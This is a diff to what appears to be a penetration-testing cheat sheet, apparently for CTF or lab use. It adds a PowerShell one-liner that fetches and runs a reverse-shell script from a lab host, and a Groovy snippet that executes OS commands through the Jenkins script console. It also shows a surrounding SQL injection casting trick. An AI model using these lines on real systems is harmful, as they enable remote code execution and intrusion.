@@ -13,6 +13,7 @@
   - [SQLi](#sqli)
  
 - [Tools](#tools)
+  - [Powershell](#powershell)
   - [whatweb](#whatweb)
   - [ntpdate](#ntpdate)
   - [MSSQL](#mssql)
@@ -596,6 +597,14 @@ cast((SELECT data_column FROM data_table LIMIT 1 OFFSET data_offset) as int)
 ```
 
 ## Tools
+
+### Powershell
+```bash
+powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.x.x/rev.ps1')
+
+
+```
+
 ### whatweb
 ```bash
 whatweb -a3 https://www.facebook.com -v
@@ -2030,7 +2039,8 @@ ls -R
 
 # Jenkins
 ```bash
-
+cmd="whoami"
+println cmd.execute().text
 
 ```
 
